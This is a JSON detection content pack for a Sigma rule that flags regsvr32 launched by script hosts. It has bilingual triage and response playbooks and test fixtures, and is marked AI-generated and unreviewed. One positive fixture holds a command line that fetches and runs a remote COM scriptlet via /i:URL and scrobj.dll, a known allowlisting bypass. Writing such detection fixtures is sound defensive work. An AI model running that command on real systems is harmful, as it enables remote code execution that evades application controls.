@@ -1,0 +1,134 @@
+{
+  "rule": {
+    "id": "ab37a6ec-6068-432b-a64e-2c7bf95b1d22",
+    "title": "Scripting/CommandLine Process Spawned Regsvr32",
+    "level": "medium",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218.010"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un intérprete de comandos o motor de scripts (cmd, PowerShell, wscript, cscript o mshta) inició regsvr32.exe. Puede ser una instalación legítima, pero también un abuso de regsvr32 para ejecutar código evadiendo controles de aplicaciones.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde Image termina en \\regsvr32.exe y ParentImage termina en cmd.exe, cscript.exe, mshta.exe, powershell.exe, powershell_ise.exe, pwsh.exe o wscript.exe. Se excluye el registro de RpcProxy.dll con /s lanzado desde C:\\Windows\\System32\\cmd.exe.",
+      "why_it_matters": "Regsvr32 es un binario firmado de Microsoft que puede cargar DLL o scriptlets COM (.sct), incluso remotos con /i:URL y scrobj.dll. Los atacantes lo usan como proxy de ejecución firmado (ATT&CK T1218.010) para evadir listas blancas y ocultar payloads.",
+      "triage_steps": [
+        "Revise el CommandLine de regsvr32: busque /i:, URL http/https, scrobj.dll, /u, /n o DLL con extensiones inusuales.",
+        "Verifique la ruta del DLL o scriptlet: rutas en %TEMP%, AppData, Downloads, ProgramData o recursos compartidos de red son sospechosas.",
+        "Analice ParentImage y su línea de comandos; identifique el script .bat, .ps1, .vbs o .hta y su origen (correo, navegador, USB).",
+        "Reconstruya el árbol de procesos: abuelo del padre (Office, navegador, explorer) e hijos de regsvr32.",
+        "Revise en el mismo host, +/- 15 minutos, conexiones de red de regsvr32, archivos creados y cambios en claves Run o servicios.",
+        "Obtenga el hash del DLL cargado y consulte reputación interna; compruebe firma digital y fecha de creación.",
+        "Busque alertas previas para el mismo usuario y host, y el mismo CommandLine en otros endpoints."
+      ],
+      "false_positives": [
+        "Scripts .bat, .ps1, .vbs o .hta legítimos de instalación o despliegue (SCCM, GPO) que registran DLL con regsvr32 /s.",
+        "Servicios o instaladores de Windows y de terceros que registran componentes COM durante actualizaciones.",
+        "Tareas de soporte técnico que re-registran DLL del sistema para reparar aplicaciones."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o el equipo de TI si la ejecución corresponde a un cambio o despliegue autorizado.",
+        "Si es malicioso, aísle el endpoint, detenga regsvr32 y el proceso padre, y bloquee la URL o dominio involucrado.",
+        "Preserve el DLL, scriptlet y script padre como evidencia; elimínelos y limpie mecanismos de persistencia tras verificarlos.",
+        "Restablezca credenciales del usuario si hubo ejecución confirmada y cree exclusiones específicas para los casos legítimos validados."
+      ],
+      "severity_rationale": "Medium es adecuado porque la combinación es una técnica de evasión conocida, pero también aparece con frecuencia en scripts administrativos legítimos."
+    },
+    "en": {
+      "summary": "A command shell or scripting engine (cmd, PowerShell, wscript, cscript or mshta) launched regsvr32.exe. This may be a legitimate install, or abuse of regsvr32 to run code while bypassing application controls.",
+      "what_it_detects": "Windows process creation events where Image ends with \\regsvr32.exe and ParentImage ends with cmd.exe, cscript.exe, mshta.exe, powershell.exe, powershell_ise.exe, pwsh.exe or wscript.exe. Silent registration of RpcProxy.dll from C:\\Windows\\System32\\cmd.exe is excluded.",
+      "why_it_matters": "Regsvr32 is a signed Microsoft binary that can load DLLs or COM scriptlets (.sct), even remote ones via /i:URL and scrobj.dll. Attackers use it as a signed execution proxy (ATT&CK T1218.010) to evade allowlisting.",
+      "triage_steps": [
+        "Review the regsvr32 CommandLine: look for /i:, http/https URLs, scrobj.dll, /u, /n or DLLs with unusual extensions.",
+        "Check the DLL or scriptlet path: %TEMP%, AppData, Downloads, ProgramData or network shares are suspicious.",
+        "Inspect the ParentImage and its command line; identify the .bat, .ps1, .vbs or .hta script and where it came from.",
+        "Rebuild the process tree: the parent's parent (Office, browser, explorer) and any regsvr32 children.",
+        "On the same host within +/- 15 minutes, check regsvr32 network connections, dropped files and Run key or service changes.",
+        "Hash the loaded DLL, check internal reputation, digital signature and creation time.",
+        "Look for earlier alerts for the same user and host, and the same CommandLine on other endpoints."
+      ],
+      "false_positives": [
+        "Legitimate .bat, .ps1, .vbs or .hta install or deployment scripts (SCCM, GPO) registering DLLs with regsvr32 /s.",
+        "Windows or third-party services and installers registering COM components during updates.",
+        "Helpdesk tasks re-registering system DLLs to repair applications."
+      ],
+      "response_steps": [
+        "Confirm with the user or IT whether the execution matches an authorized change or deployment.",
+        "If malicious, isolate the endpoint, stop regsvr32 and its parent, and block the involved URL or domain.",
+        "Preserve the DLL, scriptlet and parent script as evidence; remove them and clean persistence after verification.",
+        "Reset user credentials if execution is confirmed, and add narrow exclusions for validated legitimate cases."
+      ],
+      "severity_rationale": "Medium fits because this is a known defense-evasion pattern, yet it also appears frequently in legitimate administrative scripts."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell spawns regsvr32 to load a remote COM scriptlet via scrobj.dll",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -File C:\\Users\\jperez\\Downloads\\update.ps1",
+          "Image": "C:\\Windows\\System32\\regsvr32.exe",
+          "CommandLine": "regsvr32.exe /s /n /u /i:http://198.51.100.23/file.sct scrobj.dll",
+          "OriginalFileName": "REGSVR32.EXE"
+        }
+      },
+      {
+        "description": "wscript running a VBS from Downloads spawns regsvr32 loading a DLL from AppData",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+          "ParentCommandLine": "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\mrojas\\Downloads\\factura.vbs\"",
+          "Image": "C:\\Windows\\SysWOW64\\regsvr32.exe",
+          "CommandLine": "regsvr32.exe /s C:\\Users\\mrojas\\AppData\\Roaming\\abc.dll",
+          "OriginalFileName": "REGSVR32.EXE"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "cmd.exe silently registers RpcProxy.dll, excluded by filter_main_rpcproxy",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-RPC01.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\Temp\\rpcproxy_setup.cmd",
+          "Image": "C:\\Windows\\System32\\regsvr32.exe",
+          "CommandLine": "C:\\Windows\\System32\\regsvr32.exe /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll",
+          "OriginalFileName": "REGSVR32.EXE"
+        }
+      },
+      {
+        "description": "regsvr32 started by an installer (msiexec), parent not in the rule's list",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
+          "ParentCommandLine": "C:\\Windows\\System32\\msiexec.exe /V",
+          "Image": "C:\\Windows\\System32\\regsvr32.exe",
+          "CommandLine": "regsvr32.exe /s \"C:\\Program Files\\ExampleApp\\exampleapp.dll\"",
+          "OriginalFileName": "REGSVR32.EXE"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
